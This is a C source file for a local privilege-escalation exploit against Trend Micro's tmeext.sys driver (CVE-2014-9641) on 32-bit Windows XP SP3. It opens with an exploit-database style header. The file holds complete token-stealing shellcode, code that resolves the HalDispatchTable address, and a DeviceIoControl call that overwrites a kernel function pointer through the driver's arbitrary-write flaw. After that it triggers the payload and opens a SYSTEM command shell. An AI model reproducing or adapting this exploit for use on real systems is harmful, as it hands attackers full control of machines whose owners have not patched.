?/*

Exploit Title    - Trend Micro Multiple Products Arbitrary Write Privilege Escalation
Date             - 31st January 2015
Discovered by    - Parvez Anwar (@parvezghh)
Vendor Homepage  - http://www.trendmicro.co.uk/
Tested Version   - 8.0.1133
Driver Version   - 2.0.0.1009 - tmeext.sys
Tested on OS     - 32bit Windows XP SP3 
OSVDB            - http://www.osvdb.org/show/osvdb/115514
CVE ID           - CVE-2014-9641
Vendor fix url   - http://esupport.trendmicro.com/solution/en-US/1106233.aspx
Fixed version    - 8.0.1133
Fixed driver ver - 2.0.0.1015

*/


#include <stdio.h>
#include <windows.h>

#define BUFSIZE 4096


typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
     PVOID   Unknown1;
     PVOID   Unknown2;
     PVOID   Base;
     ULONG   Size;
     ULONG   Flags;
     USHORT  Index;
     USHORT  NameLength;
     USHORT  LoadCount;
     USHORT  PathLength;
     CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;
 
typedef struct _SYSTEM_MODULE_INFORMATION {
     ULONG   Count;
     SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS { 
     SystemModuleInformation = 11,
     SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS (WINAPI *_NtQuerySystemInformation)(
     SYSTEM_INFORMATION_CLASS SystemInformationClass,
     PVOID SystemInformation,
     ULONG SystemInformationLength,
     PULONG ReturnLength);

typedef NTSTATUS (WINAPI *_NtQueryIntervalProfile)(
     DWORD ProfileSource, 
     PULONG Interval);

typedef void (*FUNCTPTR)(); 



// Windows XP SP3

#define XP_KPROCESS 0x44      // Offset to _KPROCESS from a _ETHREAD struct
#define XP_TOKEN    0xc8      // Offset to TOKEN from the _EPROCESS struct
#define XP_UPID     0x84      // Offset to UniqueProcessId FROM the _EPROCESS struct
#define XP_APLINKS  0x88      // Offset to ActiveProcessLinks _EPROCESS struct


BYTE token_steal_xp[] =
{
  0x52,                                                  // push edx                       Save edx on the stack
  0x53,	                                                 // push ebx                       Save ebx on the stack
  0x33,0xc0,                                             // xor eax, eax                   eax = 0
  0x64,0x8b,0x80,0x24,0x01,0x00,0x00,                    // mov eax, fs:[eax+124h]         Retrieve ETHREAD
  0x8b,0x40,XP_KPROCESS,                                 // mov eax, [eax+XP_KPROCESS]     Retrieve _KPROCESS
  0x8b,0xc8,                                             // mov ecx, eax
  0x8b,0x98,XP_TOKEN,0x00,0x00,0x00,                     // mov ebx, [eax+XP_TOKEN]        Retrieves TOKEN
  0x8b,0x80,XP_APLINKS,0x00,0x00,0x00,                   // mov eax, [eax+XP_APLINKS] <-|  Retrieve FLINK from ActiveProcessLinks
  0x81,0xe8,XP_APLINKS,0x00,0x00,0x00,                   // sub eax, XP_APLINKS         |  Retrieve _EPROCESS Pointer from the ActiveProcessLinks
  0x81,0xb8,XP_UPID,0x00,0x00,0x00,0x04,0x00,0x00,0x00,  // cmp [eax+XP_UPID], 4        |  Compares UniqueProcessId with 4 (System Process)
  0x75,0xe8,                                             // jne                     ---- 
  0x8b,0x90,XP_TOKEN,0x00,0x00,0x00,                     // mov edx, [eax+XP_TOKEN]        Retrieves TOKEN and stores on EDX
  0x8b,0xc1,                                             // mov eax, ecx                   Retrieves KPROCESS stored on ECX
  0x89,0x90,XP_TOKEN,0x00,0x00,0x00,                     // mov [eax+XP_TOKEN], edx        Overwrites the TOKEN for the current KPROCESS
  0x5b,                                                  // pop ebx                        Restores ebx
  0x5a,                                                  // pop edx                        Restores edx
  0xc2,0x08                                              // ret 8                          Away from the kernel    
};



DWORD HalDispatchTableAddress() 
{
    _NtQuerySystemInformation    NtQuerySystemInformation;
    PSYSTEM_MODULE_INFORMATION   pModuleInfo;
    DWORD                        HalDispatchTable;
    CHAR                         kFullName[256];
    PVOID                        kBase = NULL;
    LPSTR                        kName;
    HMODULE                      Kernel;
    FUNCTPTR                     Hal;
    ULONG                        len;
    NTSTATUS                     status;


    NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");
 	
    if (!NtQuerySystemInformation)
    {
        printf("[-] Unable to resolve NtQuerySystemInformation\n\n");
        return -1;  
    }

    status = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);

    if (!status) 
    {
        printf("[-] An error occured while reading NtQuerySystemInformation. Status = 0x%08x\n\n", status);
        return -1;
    }
		
    pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);

    if(pModuleInfo == NULL)
    {
        printf("[-] An error occurred with GlobalAlloc for pModuleInfo\n\n");
        return -1;
    }

    status = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len);
	
    memset(kFullName, 0x00, sizeof(kFullName));
    strcpy_s(kFullName, sizeof(kFullName)-1, pModuleInfo->Module[0].ImageName);
    kBase = pModuleInfo->Module[0].Base;

    printf("[i] Kernel base name %s\n", kFullName);
    kName = strrchr(kFullName, '\\');

    Kernel = LoadLibraryA(++kName);

    if(Kernel == NULL) 
    {
        printf("[-] Failed to load kernel base\n\n");
        return -1;
    }

    Hal = (FUNCTPTR)GetProcAddress(Kernel, "HalDispatchTable");

    if(Hal == NULL)
    {
        printf("[-] Failed to find HalDispatchTable\n\n");
        return -1;
    }
    
    printf("[i] HalDispatchTable address 0x%08x\n", Hal);	
    printf("[i] Kernel handle 0x%08x\n", Kernel);
    printf("[i] Kernel base address 0x%08x\n", kBase);          

    HalDispatchTable = ((DWORD)Hal - (DWORD)Kernel + (DWORD)kBase);

    printf("[+] Kernel address of HalDispatchTable 0x%08x\n", HalDispatchTable);

    if(!HalDispatchTable)
    {
        printf("[-] Failed to calculate HalDispatchTable\n\n");
	return -1;
    }

    return HalDispatchTable;
}


int GetWindowsVersion()
{
    int v = 0;
    DWORD version = 0, minVersion = 0, majVersion = 0;

    version = GetVersion();

    minVersion = (DWORD)(HIBYTE(LOWORD(version)));
    majVersion = (DWORD)(LOBYTE(LOWORD(version)));

    if (minVersion == 1 && majVersion == 5) v = 1;  // "Windows XP;
    if (minVersion == 1 && majVersion == 6) v = 2;  // "Windows 7";
    if (minVersion == 2 && majVersion == 5) v = 3;  // "Windows Server 2003;

    return v;
}


void spawnShell()
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;


    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    si.cb          = sizeof(si); 
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;

    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {
        printf("\n[-] CreateProcess failed (%d)\n\n", GetLastError());
        return;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}


int main(int argc, char *argv[]) 
{

    _NtQueryIntervalProfile     NtQueryIntervalProfile;
    LPVOID                      input[1] = {0};    
    LPVOID                      addrtoshell;
    HANDLE                      hDevice;
    DWORD                       dwRetBytes = 0;
    DWORD                       HalDispatchTableTarget;               
    ULONG                       time = 0;
    unsigned char               devhandle[MAX_PATH]; 



    printf("-------------------------------------------------------------------------------\n");
    printf("    Trend Micro Multiple Products (tmeext.sys) Arbitrary Write EoP Exploit     \n");
    printf("                         Tested on Windows XP SP3 (32bit)                      \n");
    printf("-------------------------------------------------------------------------------\n\n");

    if (GetWindowsVersion() == 1) 
    {
        printf("[i] Running Windows XP\n");
    }

    if (GetWindowsVersion() == 0) 
    {
        printf("[i] Exploit not supported on this OS\n\n");
        return -1;
    }  

    sprintf(devhandle, "\\\\.\\%s", "tmnethk");

    NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryIntervalProfile");
 	
    if (!NtQueryIntervalProfile)
    {
        printf("[-] Unable to resolve NtQueryIntervalProfile\n\n");
        return -1;  
    }
   
    addrtoshell = VirtualAlloc(NULL, BUFSIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if(addrtoshell == NULL)
    {
        printf("[-] VirtualAlloc allocation failure %.8x\n\n", GetLastError());
        return -1;
    }
    printf("[+] VirtualAlloc allocated memory at 0x%.8x\n", addrtoshell);

    memset(addrtoshell, 0x90, BUFSIZE);
    memcpy(addrtoshell, token_steal_xp, sizeof(token_steal_xp));
    printf("[i] Size of shellcode %d bytes\n", sizeof(token_steal_xp));

    hDevice = CreateFile(devhandle, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING , 0, NULL);
    
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] CreateFile open %s device failed (%d)\n\n", devhandle, GetLastError());
        return -1;
    }
    else 
    {
        printf("[+] Open %s device successful\n", devhandle);
    }

    HalDispatchTableTarget = HalDispatchTableAddress() + sizeof(DWORD);
    printf("[+] HalDispatchTable+4 (0x%08x) will be overwritten\n", HalDispatchTableTarget);

    input[0] = addrtoshell;  // input buffer contents gets written to our output buffer address
                    
    printf("[+] Input buffer contents %08x\n", input[0]);
 	
    printf("[~] Press any key to send Exploit  . . .\n");
    getch();

    DeviceIoControl(hDevice, 0x00222400, input, sizeof(input), (LPVOID)HalDispatchTableTarget, 0, &dwRetBytes, NULL);

    printf("[+] Buffer sent\n");
    CloseHandle(hDevice);

    printf("[+] Spawning SYSTEM Shell\n");
    NtQueryIntervalProfile(2, &time);
    spawnShell();

    return 0;
}
